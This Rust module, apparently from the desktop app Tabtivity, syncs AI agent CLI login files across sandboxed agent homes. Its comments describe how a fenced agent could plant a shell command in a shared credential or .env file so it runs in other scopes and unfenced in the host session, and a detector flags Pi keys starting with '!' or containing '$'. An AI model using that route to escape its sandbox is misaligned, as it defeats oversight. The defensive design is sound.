//! One login per agent CLI, shared by every Tabtivity-owned agent home.
//!
//! Each CLI keeps its sign-in in a plain file (or a small directory) under
//! `$HOME` — see the `auth_paths` column of the registry in
//! `commands::agents`. Those paths, and only those, are shared across scopes:
//! the file lives once in `<state_dir>/agent-auth/<cli-id>/` and every scope
//! home (`services::agent_home`) carries a **copy** of it at the CLI's own
//! path — its own inode, so nothing a tab writes reaches another scope until
//! the keeper has looked at it. The keeper ([`start`]: every [`POLL`], at
//! every spawn and at every tab end) reconciles each home against the store:
//! a copy the tab changed — a login, a token refresh, whether the CLI wrote
//! in place or rotated by rename — is adopted into the store if it does not
//! switch the account, and every other home's copy is brought up to the
//! store's bytes on its next pass. The store records per home what it last
//! placed there ([`PLACED_DIR`]); that is how a tab's write is told from a
//! copy the store has since moved past, and it lives in the store, where no
//! agent can forge it.
//!
//! Until 2026-09-26 the copies were hard links to the store's one inode, so a
//! refresh reached every running tab at once — and so did any in-place
//! write, before the account guard could see it, the Host session's copy
//! included (agent_authority reevaluation, item 4). A copy costs the guard
//! nothing and the other running tabs one keeper pass.
//!
//! Directories (a CLI that keeps its login in a folder of its own) are
//! reconciled file by file, one level deep, and only for the file names the
//! registry's [`DirNames`] admits: a temporary, a backup or a planted file
//! stays in its home. Every read and write into a
//! home goes through a directory handle (`services::home_io`): the home is
//! the agent's, and the keeper runs unfenced.
//!
//! Only credential files are shared — never a config that could name a
//! command (an MCP server, a hook), nor a file the CLI loads as its
//! environment (a `.env`: `GIT_CONFIG_*` alone runs a command), which stays
//! per scope. Until 2026-10-08 four such files were shared ([`RETIRED`],
//! cleaned up by [`retire_shared_paths_in`]). Where the file
//! names an account, the store records it at first adoption and a later file
//! naming a different account is **not** adopted (the store's copy is put
//! back over it; the tab keeps the token it already loaded); switching
//! accounts on purpose is Sign out, then log in again. Where a credential
//! file can itself name a command — Pi runs an API key that starts with `!`
//! through a shell on every read — a file that does is not adopted either
//! ([`names_command`]): adopted, it would run in every other scope's fence
//! and unfenced in the Host session. AppHandle-free and unit-testable.

use std::collections::BTreeSet;
use std::io;
use std::path::{Path, PathBuf};
use std::sync::{Mutex, OnceLock};
use std::time::Duration;

use serde::{Deserialize, Serialize};

use crate::services::home_io::{HomeDir, HomeFile};
use crate::storage;

/// The directory under the state dir holding every CLI's login.
pub const STORE_DIR: &str = "agent-auth";
/// The keeper's cadence: a login or refresh done in a tab reaches the other
/// scopes' next spawn at once (spawn reconciles) and their running tabs
/// within this.
const POLL: Duration = Duration::from_secs(5);
/// Sidecar in a CLI's store dir naming the account the store was adopted from.
const ACCOUNT_FILE: &str = ".account";
/// Sidecar left when an adoption was refused, for the Agents view to show.
const BLOCKED_FILE: &str = ".blocked";
/// Per CLI store dir: `<home key>/<leaf>` holds the digest of the bytes the
/// store last placed in that home at that path.
const PLACED_DIR: &str = ".placed";

/// What kind of path a CLI keeps its login in.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AuthKind {
    /// One file; copied into every home.
    File,
    /// A directory holding the login; the files in it whose names
    /// [`DirNames`] admits are copied into every home, nothing else.
    Dir(DirNames),
}

/// Which file names in a login directory are the login, read off each CLI's
/// published bundle (threat recheck 2026-10-08, gap 16). Anything else in
/// the folder — a temporary caught mid-write, a logout backup, a marker, a
/// file an agent planted — stays in the home it was written in.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DirNames {
    /// `<name>.json` with no leading dot (Kimi Code's `FileTokenStorage`:
    /// `kimi-code.json`, or `<oauth key>.json`; temporaries are
    /// `<name>.json.tmp.<pid>.<hex>`).
    Json,
    /// `<authId>.info` with no leading dot (CodeBuddy's `getAuthSavePath`),
    /// minus the logout backups `<stem>.<ISO time>.<pid>.<uuid>.info`, which
    /// would otherwise pile up in every home. The `.logged-out` marker and
    /// the `.lock` directory stay per scope.
    CodeBuddyInfo,
}

impl DirNames {
    /// Whether `name`, one entry of the login directory, is shared.
    pub fn admits(self, name: &str) -> bool {
        let plain = !name.is_empty() && !name.starts_with('.') && !name.contains(['/', '\\']);
        match self {
            DirNames::Json => plain && name.ends_with(".json") && name.len() > ".json".len(),
            DirNames::CodeBuddyInfo => {
                plain && name.ends_with(".info") && name.len() > ".info".len() && !is_codebuddy_logout_backup(name)
            }
        }
    }
}

/// A CodeBuddy logout backup: `….<YYYY-MM-DD>T<digits and ->Z.<pid>.<uuid>.info`
/// (the ISO time with `-` for `:` and `.`).
fn is_codebuddy_logout_backup(name: &str) -> bool {
    static BACKUP: OnceLock<regex::Regex> = OnceLock::new();
    BACKUP
        .get_or_init(|| {
            regex::Regex::new(r"\.\d{4}-\d\d-\d\dT[0-9-]+Z\.\d+\.[0-9a-f-]{36}\.info$").expect("valid regex")
        })
        .is_match(name)
}

/// One login path of a CLI, relative to `$HOME`, forward slashes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct AuthPath {
    pub rel: &'static str,
    pub kind: AuthKind,
}

pub const fn file(rel: &'static str) -> AuthPath {
    AuthPath { rel, kind: AuthKind::File }
}

pub const fn dir(rel: &'static str, names: DirNames) -> AuthPath {
    AuthPath { rel, kind: AuthKind::Dir(names) }
}

/// `<state_dir>/agent-auth/`.
pub fn store_root_in(state_dir: &Path) -> PathBuf {
    state_dir.join(STORE_DIR)
}

/// `<state_dir>/agent-auth/<cli-id>/`.
pub fn store_dir_in(state_dir: &Path, cli: &str) -> PathBuf {
    store_root_in(state_dir).join(storage::project_key(cli))
}

/// A path's home-relative spelling as one store leaf: `.claude/.credentials.json`
/// → `.claude_.credentials.json`.
fn leaf_of(rel: &str) -> String {
    rel.replace(['/', '\\'], "_")
}

/// Where `path`'s login lives in the store of `cli`.
pub fn store_path_in(state_dir: &Path, cli: &str, path: &AuthPath) -> PathBuf {
    store_dir_in(state_dir, cli).join(leaf_of(path.rel))
}

fn home_path(home: &Path, rel: &str) -> PathBuf {
    rel.split('/').fold(home.to_path_buf(), |p, seg| p.join(seg))
}

/// The registry's login paths, `(cli id, paths)`.
fn registry() -> Vec<(&'static str, &'static [AuthPath])> {
    crate::commands::agents::auth_registry()
}

fn digest(bytes: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    format!("{:x}", Sha256::digest(bytes))
}

/// The home's key in the store's records: its directory name, which is the
/// scope's `project_key` (unique per scope, `host` for the Host session).
fn home_key(home: &Path) -> String {
    home.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default()
}

fn placed_file(store_dir: &Path, home: &Path, leaf: &str) -> PathBuf {
    store_dir.join(PLACED_DIR).join(home_key(home)).join(leaf)
}

fn read_placed(store_dir: &Path, home: &Path, leaf: &str) -> Option<String> {
    read_sidecar(&store_dir.join(PLACED_DIR).join(home_key(home)), leaf)
}

fn write_placed(store_dir: &Path, home: &Path, leaf: &str, hash: &str) {
    let path = placed_file(store_dir, home, leaf);
    if let Some(parent) = path.parent() {
        let _ = crate::services::agent_home::create_private_dir(parent);
    }
    let _ = std::fs::write(path, hash);
}

/// A non-blank file's bytes.
fn content(bytes: Option<Vec<u8>>) -> Option<Vec<u8>> {
    bytes.filter(|b| !b.iter().all(u8::is_ascii_whitespace))
}

/// Write a store file (`0600`) by temporary and rename: the store dir is
/// Tabtivity's own, but a keeper pass and a spawn may run at once.
fn write_store(path: &Path, bytes: &[u8]) -> io::Result<()> {
    use std::io::Write;
    let parent = path.parent().ok_or_else(|| io::Error::other("missing parent directory"))?;
    crate::services::agent_home::create_private_dir(parent)?;
    let mut tmp = tempfile::NamedTempFile::new_in(parent)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        tmp.as_file().set_permissions(std::fs::Permissions::from_mode(0o600))?;
    }
    tmp.write_all(bytes)?;
    tmp.persist(path).map_err(|e| e.error)?;
    Ok(())
}

/// The account a login file names, where a CLI's file does: Codex's
/// `tokens.account_id`; Claude's identity is read off `.claude.json`
/// ([`claude_account_in_home`]) since its credential file names none.
pub fn account_of(cli: &str, bytes: &[u8]) -> Option<String> {
    let value: serde_json::Value = serde_json::from_slice(bytes).ok()?;
    let found = match cli {
        "codex" => value
            .pointer("/tokens/account_id")
            .and_then(|v| v.as_str())
            .map(str::to_string),
        _ => None,
    };
    found.filter(|s| !s.is_empty())
}

/// The signed-in Claude account of a home, from its `.claude.json`.
pub fn claude_account_in_home(home: &Path) -> Option<String> {
    let bytes = HomeFile::open_existing(home, ".claude.json")?.read()?;
    let value: serde_json::Value = serde_json::from_slice(&bytes).ok()?;
    value
        .pointer("/oauthAccount/emailAddress")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
        .map(str::to_string)
}

fn read_sidecar(dir: &Path, name: &str) -> Option<String> {
    std::fs::read_to_string(dir.join(name))
        .ok()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
}

/// Why an adoption was refused, recorded per CLI for the Agents view:
/// either the file signed in as `account` while the store holds `stored`,
/// or it named a `command` where a credential belongs.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Default)]
pub struct Blocked {
    pub account: Option<String>,
    pub stored: Option<String>,
    pub command: Option<String>,
}

/// Where `bytes` would make `cli` run a command, if anywhere: the field, for
/// the Agents view. Pi resolves an `api_key` credential's `key` on every
/// read — a leading `!` is a shell command, `$NAME` reads the process
/// environment — so only a literal key is a credential. Bytes that do not
/// parse name nothing: the CLI would not load them either.
pub fn names_command(cli: &str, bytes: &[u8]) -> Option<String> {
    if cli != "pi" {
        return None;
    }
    let value: serde_json::Value = serde_json::from_slice(bytes).ok()?;
    let creds = value.as_object()?;
    creds.iter().find_map(|(provider, cred)| {
        let key = cred.get("key")?.as_str()?;
        (key.starts_with('!') || key.contains('$')).then(|| format!("{provider}.key"))
    })
}

fn write_blocked(store_dir: &Path, blocked: &Blocked) {
    if let Ok(body) = serde_json::to_vec(blocked) {
        let _ = std::fs::write(store_dir.join(BLOCKED_FILE), body);
    }
}

/// Adopt `bytes`, which a tab wrote into `home`, into `store`, unless they
/// switch the account. Returns whether the store now holds them.
fn adopt(cli: &str, store_dir: &Path, store: &Path, home: &Path, bytes: &[u8]) -> bool {
    let account = if cli == "claude" {
        claude_account_in_home(home)
    } else {
        account_of(cli, bytes)
    };
    if let (Some(new), Some(stored)) = (&account, read_sidecar(store_dir, ACCOUNT_FILE)) {
        if *new != stored {
            // The accounts stay out of the log; the blocked record names them.
            eprintln!("agent_auth: {cli}: a tab signed in as another account than the store's; not adopted");
            write_blocked(
                store_dir,
                &Blocked { account: Some(new.clone()), stored: Some(stored), ..Blocked::default() },
            );
            return false;
        }
    }
    if let Some(field) = names_command(cli, bytes) {
        eprintln!("agent_auth: {cli}: a tab's login names a command at {field}; not adopted");
        write_blocked(store_dir, &Blocked { command: Some(field), ..Blocked::default() });
        return false;
    }
    if let Err(e) = write_store(store, bytes) {
        eprintln!("agent_auth: {cli}: store {}: {e}", store.display());
        return false;
    }
    if let Some(account) = account {
        let _ = std::fs::write(store_dir.join(ACCOUNT_FILE), account);
    }
    let _ = std::fs::remove_file(store_dir.join(BLOCKED_FILE));
    true
}

/// Which half of a reconciliation runs. A pass over every home adopts from
/// all of them first and places into all of them after, so a login made in
/// any home reaches every other in the same pass whatever the order.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Step {
    Adopt,
    Place,
    Both,
}

impl Step {
    fn adopts(self) -> bool {
        self != Step::Place
    }

    fn places(self) -> bool {
        self != Step::Adopt
    }
}

/// Reconcile one shared file: the store's `store` against the home's `copy`.
///
/// 1. A copy that differs from what the store last placed there is the
///    tab's own write (a login, a refresh — in place or by rename): adopted
///    if it does not switch the account.
/// 2. Then the store's bytes go into the home, whatever it held: a refused
///    login is overwritten, a stale copy caught up, a hard link from an
///    older Tabtivity replaced by a copy of its own.
///
/// A local-model home ([`is_local_model_home`]) only receives: what lands
/// there is `ollama launch`'s wiring for that CLI (it was written for Cline's
/// `providers.json`, which gains `lastUsedProvider: "ollama"` and has been
/// per scope since 2026-10-08), never a login to hand every other scope. It is not adopted, and the store is not placed over a copy the home
/// changed since the store last placed it, which would pull the wiring from
/// under a running tab.
fn reconcile_file(cli: &str, store_dir: &Path, store: &Path, leaf: &str, home: &Path, copy: &HomeFile, step: Step) {
    let home_bytes = content(copy.read());
    let store_bytes = content(std::fs::read(store).ok());
    let receive_only = crate::services::agent_home::is_local_model_home(home);
    if receive_only
        && home_bytes.as_ref().is_some_and(|b| {
            store_bytes.as_ref() != Some(b)
                && read_placed(store_dir, home, leaf).as_deref() != Some(digest(b).as_str())
        })
    {
        return;
    }
    if let (Some(bytes), true, false) = (&home_bytes, step.adopts(), receive_only) {
        let hash = digest(bytes);
        let placed = read_placed(store_dir, home, leaf);
        let changed = placed.as_deref() != Some(hash.as_str()) && store_bytes.as_deref() != Some(bytes.as_slice());
        if changed && adopt(cli, store_dir, store, home, bytes) {
            write_placed(store_dir, home, leaf, &hash);
            return;
        }
    }
    if !step.places() {
        return;
    }
    let Some(bytes) = store_bytes else { return };
    let hash = digest(&bytes);
    let linked = copy.metadata().and_then(|m| m.ino).is_some_and(|ino| {
        #[cfg(unix)]
        {
            use std::os::unix::fs::MetadataExt;
            std::fs::metadata(store).is_ok_and(|m| (m.dev(), m.ino()) == ino)
        }
        #[cfg(not(unix))]
        {
            let _ = ino;
            false
        }
    });
    if linked || home_bytes.as_deref() != Some(bytes.as_slice()) {
        match copy.write(&bytes) {
            Ok(()) => write_placed(store_dir, home, leaf, &hash),
            Err(e) => eprintln!("agent_auth: {cli}: place {}: {e}", copy.path().display()),
        }
    } else if read_placed(store_dir, home, leaf).as_deref() != Some(hash.as_str()) {
        write_placed(store_dir, home, leaf, &hash);
    }
}

/// The names of the regular files in a store directory.
fn store_dir_files(store: &Path) -> Vec<String> {
    let Ok(entries) = std::fs::read_dir(store) else {
        return Vec::new();
    };
    entries
        .flatten()
        .filter(|e| e.file_type().is_ok_and(|t| t.is_file()))
        .filter_map(|e| e.file_name().to_str().map(str::to_string))
        .collect()
}

/// The login files of a store directory: the regular files `names` admits.
fn store_dir_logins(store: &Path, names: DirNames) -> Vec<String> {
    store_dir_files(store).into_iter().filter(|n| names.admits(n)).collect()
}

/// Reconcile a login directory file by file, one level deep: every name the
/// store or the home holds that `names` admits. Any other file in the folder
/// is neither adopted nor placed.
fn reconcile_dir(cli: &str, store_dir: &Path, store: &Path, rel: &str, names: DirNames, home: &Path, step: Step) {
    let has_store = !store_dir_logins(store, names).is_empty();
    let home_dir = if has_store { HomeDir::open(home, rel) } else { HomeDir::open_existing(home, rel) };
    let Some(home_dir) = home_dir else { return };
    let names: BTreeSet<String> = store_dir_logins(store, names)
        .into_iter()
        .chain(home_dir.names().into_iter().filter(|n| names.admits(n)))
        .collect();
    for name in names {
        let Some(copy) = home_dir.file(&name) else { continue };
        if !copy.exists() && !store.join(&name).is_file() {
            continue;
        }
        let leaf = format!("{}_{}", leaf_of(rel), name);
        reconcile_file(cli, store_dir, &store.join(&name), &leaf, home, &copy, step);
    }
}

/// Reconcile one home against the store, both ways: adopt what its tabs
/// wrote, then place the store's logins. Pure over `state_dir`/`home`.
pub fn reconcile_home_in(state_dir: &Path, home: &Path) {
    reconcile_home_step(state_dir, home, Step::Both);
}

fn reconcile_home_step(state_dir: &Path, home: &Path, step: Step) {
    for (cli, paths) in registry() {
        let store_dir = store_dir_in(state_dir, cli);
        for path in paths {
            let store = store_path_in(state_dir, cli, path);
            match path.kind {
                AuthKind::File => {
                    // The directories are created only once there is a login
                    // to place; a home without one is left as it is.
                    let copy = if store.is_file() {
                        HomeFile::open(home, path.rel)
                    } else {
                        HomeFile::open_existing(home, path.rel)
                    };
                    if let Some(copy) = copy {
                        reconcile_file(cli, &store_dir, &store, &leaf_of(path.rel), home, &copy, step);
                    }
                }
                AuthKind::Dir(names) => reconcile_dir(cli, &store_dir, &store, path.rel, names, home, step),
            }
        }
        if cli == "claude" && step.places() {
            link_claude_identity(&store_dir, home);
        }
    }
}

/// Claude's `.claude.json` identity: the store keeps a copy of the identity
/// keys; a home whose file lacks a signed-in account gets them, and a home
/// that signed in feeds them back (same account rule as the credentials).
fn link_claude_identity(store_dir: &Path, home: &Path) {
    let identity = store_dir.join("identity.json");
    let Some(file) = HomeFile::open(home, ".claude.json") else { return };
    let mut value: serde_json::Value = file
        .read()
        .and_then(|b| serde_json::from_slice(&b).ok())
        .unwrap_or_else(|| serde_json::json!({}));
    if !value.is_object() {
        return;
    }
    let stored: Option<serde_json::Value> = std::fs::read(&identity)
        .ok()
        .and_then(|b| serde_json::from_slice(&b).ok());
    let home_account = claude_account_in_home(home);
    let stored_account = read_sidecar(store_dir, ACCOUNT_FILE);
    match (home_account, stored) {
        // The home is signed in: record its identity unless it is another
        // account, or the home is a receive-only local-model one.
        (Some(account), _)
            if stored_account.as_deref().is_none_or(|s| s == account)
                && !crate::services::agent_home::is_local_model_home(home) =>
        {
            let mut keys = crate::services::agent_home::filtered_claude_json(&value, &[]);
            keys.as_object_mut().map(|o| o.remove("projects"));
            if let Ok(body) = serde_json::to_vec(&keys) {
                let _ = write_store(&identity, &body);
            }
            let _ = std::fs::write(store_dir.join(ACCOUNT_FILE), account);
        }
        // Not signed in here, but the store knows who: seed the identity keys.
        (None, Some(stored)) => {
            let Some(obj) = value.as_object_mut() else { return };
            let mut changed = false;
            if let Some(src) = stored.as_object() {
                for (k, v) in src {
                    if obj.get(k) != Some(v) {
                        obj.insert(k.clone(), v.clone());
                        changed = true;
                    }
                }
            }
            if changed {
                if let Ok(body) = serde_json::to_vec_pretty(&value) {
                    let _ = file.write(&body);
                }
            }
        }
        _ => {}
    }
}

/// [`reconcile_home_in`] against the real state dir — what every local
/// agent spawn runs for its home before the agent starts.
pub fn link_into_home(state_dir: &Path, home: &Path) {
    reconcile_home_in(state_dir, home);
}

/// Environment that makes a CLI keep its login in its file instead of a
/// keyring the fence hides (or that fails inside it), by command basename.
pub fn fence_env(bin: &str) -> &'static [(&'static str, &'static str)] {
    match bin {
        "muse" => &[("TBH_CREDENTIAL_BACKEND", "file")],
        "droid" => &[("FACTORY_DISABLE_KEYRING", "1")],
        "goose" => &[("GOOSE_DISABLE_KEYRING", "1")],
        "gemini" => &[("GEMINI_FORCE_FILE_STORAGE", "true")],
        "qwen" => &[("QWEN_CODE_FORCE_FILE_STORAGE", "true")],
        "qoder" => &[("QODER_FORCE_FILE_STORAGE", "true")],
        // `fail`, not `null`: the null backend drops writes silently.
        "vibe" => &[("PYTHON_KEYRING_BACKEND", "keyring.backends.fail.Keyring")],
        _ => &[],
    }
}

/// Apply [`fence_env`] for the spawn's command to its environment. A value
/// the user already set wins.
pub fn apply_fence_env(cmd: &str, env: &mut std::collections::HashMap<String, String>) {
    let bin = cmd.rsplit(['/', '\\']).next().unwrap_or(cmd);
    let bin = bin.strip_suffix(".exe").unwrap_or(bin);
    for (k, v) in fence_env(bin) {
        env.entry((*k).to_string()).or_insert_with(|| (*v).to_string());
    }
}

/// One CLI's login as the Agents view shows it.
#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct LoginStatus {
    pub id: String,
    /// The store holds a login for this CLI.
    pub signed_in: bool,
    /// The account it names, where the file names one.
    pub account: Option<String>,
    /// The user's own home has a login to import.
    pub importable: bool,
    /// A tab signed in as another account and was not adopted.
    pub blocked: Option<Blocked>,
    /// This CLI keeps its login somewhere Tabtivity cannot share (a keyring, a
    /// database mixed with other state): one login per scope.
    pub shared: bool,
    /// The CLI is switched on for a stored provider API key and one of its
    /// providers has one (`services::agent_api_keys`). Filled by the
    /// `agent_logins` command, never here: this module stays keyring-free.
    pub api_key: bool,
    /// Of an `api_key` CLI: its provider's monthly budget is spent, or no
    /// limit is set, so its keyed tabs are refused (`services::api_usage`).
    /// Filled by the `agent_logins` command too.
    pub api_budget_reached: bool,
}

pub fn status_in(state_dir: &Path, user_home: &Path) -> Vec<LoginStatus> {
    registry()
        .into_iter()
        .map(|(cli, paths)| {
            let store_dir = store_dir_in(state_dir, cli);
            let signed_in = paths.iter().any(|p| {
                let s = store_path_in(state_dir, cli, p);
                match p.kind {
                    AuthKind::File => std::fs::metadata(&s).is_ok_and(|m| m.len() > 0),
                    AuthKind::Dir(names) => !store_dir_logins(&s, names).is_empty(),
                }
            });
            let importable = paths.iter().any(|p| {
                let src = home_path(user_home, p.rel);
                match p.kind {
                    AuthKind::File => src.exists(),
                    AuthKind::Dir(names) => !store_dir_logins(&src, names).is_empty(),
                }
            });
            let blocked = std::fs::read(store_dir.join(BLOCKED_FILE))
                .ok()
                .and_then(|b| serde_json::from_slice::<Blocked>(&b).ok())
                .filter(|b| b.account.is_some() || b.command.is_some());
            LoginStatus {
                id: cli.to_string(),
                signed_in,
                account: read_sidecar(&store_dir, ACCOUNT_FILE),
                importable,
                blocked,
                shared: !paths.is_empty(),
                api_key: false,
                api_budget_reached: false,
            }
        })
        .collect()
}

pub fn status() -> Vec<LoginStatus> {
    status_in(&storage::state_dir(), &crate::paths::home_dir())
}

/// Remove a home's copies of `cli`'s login paths.
fn remove_copies(home: &Path, paths: &[AuthPath]) {
    for path in paths {
        match path.kind {
            AuthKind::File => {
                if let Some(copy) = HomeFile::open_existing(home, path.rel) {
                    if copy.exists() {
                        let _ = copy.remove();
                    }
                }
            }
            AuthKind::Dir(names) => {
                if let Some(dir) = HomeDir::open_existing(home, path.rel) {
                    for name in dir.names().into_iter().filter(|n| names.admits(n)) {
                        if let Some(copy) = dir.file(&name) {
                            let _ = copy.remove();
                        }
                    }
                }
            }
        }
    }
}

/// Copy the user's own login files for `cli` into the store (the one safe
/// direction: this computer → Tabtivity), then place them into every home,
/// whatever it held. The account record is reset to whatever the imported
/// file names. Instructions, skills and MCP entries are never imported.
pub fn import_from_user_home_in(state_dir: &Path, user_home: &Path, cli: &str) -> Result<usize, String> {
    let paths = registry()
        .into_iter()
        .find(|(id, _)| *id == cli)
        .map(|(_, p)| p)
        .ok_or_else(|| format!("unknown agent: {cli}"))?;
    let store_dir = store_dir_in(state_dir, cli);
    crate::services::agent_home::create_private_dir(&store_dir).map_err(|e| e.to_string())?;
    let _ = std::fs::remove_file(store_dir.join(ACCOUNT_FILE));
    let _ = std::fs::remove_file(store_dir.join(BLOCKED_FILE));
    let _ = std::fs::remove_dir_all(store_dir.join(PLACED_DIR));
    let mut copied = 0;
    for path in paths {
        let src = home_path(user_home, path.rel);
        let store = store_path_in(state_dir, cli, path);
        match path.kind {
            AuthKind::File if src.is_file() => {
                let bytes = std::fs::read(&src).map_err(|e| format!("{}: {e}", src.display()))?;
                write_store(&store, &bytes).map_err(|e| format!("{}: {e}", store.display()))?;
                if let Some(account) = account_of(cli, &bytes) {
                    let _ = std::fs::write(store_dir.join(ACCOUNT_FILE), account);
                }
                copied += 1;
            }
            AuthKind::Dir(names) if src.is_dir() => {
                let _ = std::fs::remove_dir_all(&store);
                if copy_dir_logins(&src, &store, names).map_err(|e| format!("{}: {e}", src.display()))? > 0 {
                    copied += 1;
                }
            }
            _ => {}
        }
    }
    if cli == "claude" {
        // The identity keys of the user's `.claude.json`, so the first tab is
        // not a fresh install; its `projects` map stays with the user.
        if let Some(value) = std::fs::read(user_home.join(".claude.json"))
            .ok()
            .and_then(|b| serde_json::from_slice::<serde_json::Value>(&b).ok())
        {
            let mut keys = crate::services::agent_home::filtered_claude_json(&value, &[]);
            keys.as_object_mut().map(|o| o.remove("projects"));
            if let Some(account) = keys
                .pointer("/oauthAccount/emailAddress")
                .and_then(|v| v.as_str())
            {
                let _ = std::fs::write(store_dir.join(ACCOUNT_FILE), account);
            }
            if let Ok(body) = serde_json::to_vec(&keys) {
                let _ = write_store(&store_dir.join("identity.json"), &body);
            }
        }
    }
    if copied == 0 {
        return Err(concat!("this computer holds no login file for that CLI (it may keep it in a keyring — log in once in a ", crate::app_name!(), " tab instead)").into());
    }
    for home in crate::services::agent_home::existing_homes_in(state_dir) {
        remove_copies(&home, paths);
        reconcile_home_in(state_dir, &home);
    }
    Ok(copied)
}

pub fn import_from_user_home(cli: &str) -> Result<usize, String> {
    import_from_user_home_in(&storage::state_dir(), &crate::paths::home_dir(), cli)
}

/// Marks that the first start of the login store has run.
const IMPORTED_MARKER: &str = ".agent_logins_imported";

/// Import, once, every login this computer holds for a CLI the store has no
/// login for yet, so the upgrade to per-scope homes keeps every agent signed
/// in without a trip to Settings. Never repeated: a later Sign out stays
/// signed out. Run before the keeper starts and before any tab spawns.
pub fn import_once_in(state_dir: &Path, user_home: &Path) {
    let marker = state_dir.join(IMPORTED_MARKER);
    if marker.exists() {
        return;
    }
    for login in status_in(state_dir, user_home) {
        if login.shared && login.importable && !login.signed_in {
            if let Err(e) = import_from_user_home_in(state_dir, user_home, &login.id) {
                eprintln!("agent_auth: first import of {}: {e}", login.id);
            }
        }
    }
    let _ = std::fs::write(&marker, b"");
}

pub fn import_once() {
    import_once_in(&storage::state_dir(), &crate::paths::home_dir());
}

/// Login files that left the shared set on 2026-10-08 (threat recheck,
/// gap 16): dotenv files and a provider config the CLIs load as their
/// environment or configuration, so a fenced agent could plant a command in
/// one and have it run in every other scope — and unfenced in the Host
/// session. They are per-scope files now, like Continue's and Crush's.
/// `(cli id, home-relative path)`; each was its CLI's only shared path.
const RETIRED: &[(&str, &str)] = &[
    ("vibe", ".vibe/.env"),
    ("aider", ".aider/oauth-keys.env"),
    ("mini-swe-agent", ".config/mini-swe-agent/.env"),
    ("cline", ".cline/data/settings/providers.json"),
];

/// Clean up after paths that stopped being shared ([`RETIRED`], and the
/// names a login directory no longer admits). Idempotent and marker-free:
/// it keys on what the store still holds. Run at startup before
/// [`import_once`] and the keeper.
///
/// - Every scope home and local-model home keeps its copy: the copies have
///   been their own inodes since 2026-09-26, and the login survives in every
///   scope that had it.
/// - The Host home (unfenced) loses its copy of a retired file where the
///   bytes are the store's current ones or the ones the store last placed
///   there — that is, Tabtivity put it there, from whichever scope. A copy
///   that differs from both is the Host session's own write and stays.
/// - Then the CLI's store directory goes, with its records.
/// - In a login directory, every store file the allowlist no longer admits
///   goes, and a home's copy of such a name only where it still matches
///   what the store placed in that home.
///
/// Users who want one key everywhere put the file into the Tabtivity-wide
/// layer (`services::agent_global`); the store's copy is not moved there,
/// since an agent may have written it.
pub fn retire_shared_paths_in(state_dir: &Path) {
    let host = crate::services::agent_home::host_home_in(state_dir);
    for (cli, rel) in RETIRED {
        let store_dir = store_dir_in(state_dir, cli);
        if !store_dir.is_dir() {
            continue;
        }
        let leaf = leaf_of(rel);
        if let Some(copy) = HomeFile::open_existing(&host, rel) {
            if let Some(bytes) = copy.read() {
                let hash = digest(&bytes);
                let ours = std::fs::read(store_dir.join(&leaf)).is_ok_and(|s| digest(&s) == hash)
                    || read_placed(&store_dir, &host, &leaf).as_deref() == Some(hash.as_str());
                if ours {
                    if let Err(e) = copy.remove() {
                        eprintln!("agent_auth: {cli}: retire the Host copy: {e}");
                        // Keep the store so the next start can tell again.
                        continue;
                    }
                }
            }
        }
        if let Err(e) = std::fs::remove_dir_all(&store_dir) {
            eprintln!("agent_auth: {cli}: retire {}: {e}", store_dir.display());
        }
    }
    let homes = crate::services::agent_home::existing_homes_in(state_dir);
    for (cli, paths) in registry() {
        for path in paths {
            let AuthKind::Dir(names) = path.kind else { continue };
            retire_dir_names(state_dir, cli, path.rel, names, &homes);
        }
    }
}

pub fn retire_shared_paths() {
    retire_shared_paths_in(&storage::state_dir());
}

/// The login-directory half of [`retire_shared_paths_in`] for one folder.
fn retire_dir_names(state_dir: &Path, cli: &str, rel: &str, names: DirNames, homes: &[PathBuf]) {
    let store_dir = store_dir_in(state_dir, cli);
    let store = store_dir.join(leaf_of(rel));
    let prefix = format!("{}_", leaf_of(rel));
    for home in homes {
        let Some(dir) = HomeDir::open_existing(home, rel) else { continue };
        for name in dir.names().into_iter().filter(|n| !names.admits(n)) {
            let Some(placed) = read_placed(&store_dir, home, &format!("{prefix}{name}")) else { continue };
            let Some(copy) = dir.file(&name) else { continue };
            if copy.read().is_some_and(|b| digest(&b) == placed) {
                let _ = copy.remove();
            }
        }
    }
    for name in store_dir_files(&store).into_iter().filter(|n| !names.admits(n)) {
        let _ = std::fs::remove_file(store.join(name));
    }
    let Ok(records) = std::fs::read_dir(store_dir.join(PLACED_DIR)) else { return };
    for record_dir in records.flatten().map(|e| e.path()) {
        for leaf in store_dir_files(&record_dir) {
            if leaf.strip_prefix(&prefix).is_some_and(|name| !names.admits(name)) {
                let _ = std::fs::remove_file(record_dir.join(leaf));
            }
        }
    }
}

/// Copy the login files of the user's login directory `src` into the store
/// directory `dst`: one level, regular files `names` admits, nothing else.
/// Returns how many it copied.
fn copy_dir_logins(src: &Path, dst: &Path, names: DirNames) -> io::Result<usize> {
    let logins = store_dir_logins(src, names);
    if logins.is_empty() {
        return Ok(0);
    }
    crate::services::agent_home::create_private_dir(dst)?;
    for name in &logins {
        let bytes = std::fs::read(src.join(name))?;
        write_store(&dst.join(name), &bytes)?;
    }
    Ok(logins.len())
}

/// Forget the login of `cli` everywhere: the store and every home's copy.
pub fn sign_out_in(state_dir: &Path, cli: &str) -> Result<(), String> {
    let paths = registry()
        .into_iter()
        .find(|(id, _)| *id == cli)
        .map(|(_, p)| p)
        .ok_or_else(|| format!("unknown agent: {cli}"))?;
    let store_dir = store_dir_in(state_dir, cli);
    for home in crate::services::agent_home::existing_homes_in(state_dir) {
        remove_copies(&home, paths);
        if cli == "claude" {
            if let Some(file) = HomeFile::open_existing(&home, ".claude.json") {
                strip_claude_identity(&file);
            }
        }
    }
    if store_dir.exists() {
        std::fs::remove_dir_all(&store_dir).map_err(|e| e.to_string())?;
    }
    Ok(())
}

pub fn sign_out(cli: &str) -> Result<(), String> {
    sign_out_in(&storage::state_dir(), cli)
}

